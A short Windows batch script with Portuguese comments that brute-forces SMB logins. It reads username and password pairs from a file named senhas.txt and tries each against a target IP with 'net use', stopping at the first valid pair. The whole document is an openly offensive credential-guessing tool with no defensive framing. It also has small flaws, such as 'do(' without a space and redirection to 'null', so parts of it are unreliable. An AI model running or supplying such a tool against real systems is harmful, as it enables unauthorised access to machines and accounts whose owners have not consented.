::para desativar toda a exibição do terminal
@echo off

::defina aqui o IP alvo
set "ip_alvo=<ip_alvo>"

for /f "tokens=1,2" %%i in (senhas.txt) do(
    echo Testando senha: %%i / %%j...
    net use \\%ip_alvo% %%j /user:%%i > null 2>&1
    if %errorlevel%==0 (
        echo [SUCESSO] credenciais validas: %%i / %%j
        exit /b 0
    ) else (
        echo [FALHA] credenciais invalidas: %%i / %%j
    )
)
echo todas as combinações falharam
exit /b 1